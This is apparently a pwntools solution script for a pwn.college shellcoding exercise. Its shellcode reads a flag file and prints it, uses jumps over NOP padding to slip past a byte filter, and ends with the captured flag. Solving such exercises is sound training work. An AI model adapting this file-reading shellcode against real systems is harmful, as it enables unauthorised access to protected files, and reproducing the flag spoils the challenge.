from pwn import *
# io = process('./babyshell_level')

context.arch = 'amd64'

sc = asm('''
    ; //open("/flag", O_RDONLY, 0)
    push 0x67616c66
    xor eax,eax
    jmp next
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next:
    mov al, 0x2              ; //syscall number for open   
    push rsp
    pop rdi              
    xor esi, esi              ; //O_RDONLY = 0
    xor edx, edx              ; //mode (not needed for O_RDONLY)
    jmp next2
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next2:
    syscall                   ; //make the syscall
    ; //Save the file descriptor returned in rax
    mov rdi, rax              ; //move the file descriptor into rdi for read
    ; //read(fd, buf, 0x50)
    xor rax, rax              ; //syscall number for read (rax = 0)
    jmp next3
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next3:
    mov rsi, rsp              ; //buffer (use the stack)
    mov edx, 0x50             ; //number of bytes to read
    jmp next4
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next4:
    syscall                   ; //make the syscall
    ; //write(1, buf, rax)
    mov rdx, rax              ; //rdx = number of bytes read
    mov al, 0x1              ; //syscall number for write
    jmp next5
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next5:
    xor edi,edi
    inc edi              ; //file descriptor 1 (stdout)
    push rsp
    pop rsi
    syscall                   ; //make the syscall
    jmp next6
    ; //Exit the program
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    next6:
    mov al, 60               ; //syscall number for exit
    xor edi, edi              ; //status code 0
    syscall                   ; //make the syscall

    ''')


# gdb.debug_shellcode(sc)
print(disasm(sc))
print(len(sc))

elf = ELF.from_bytes(sc)

elf.write(elf.entrypoint, sc)

# Save as an ELF binary
elf.save('shellcode_executable')

'''
pwn.college{8CsrPmEZNxoy4B3LZ886IINED05.QX1IjMsETM5kzW}
'''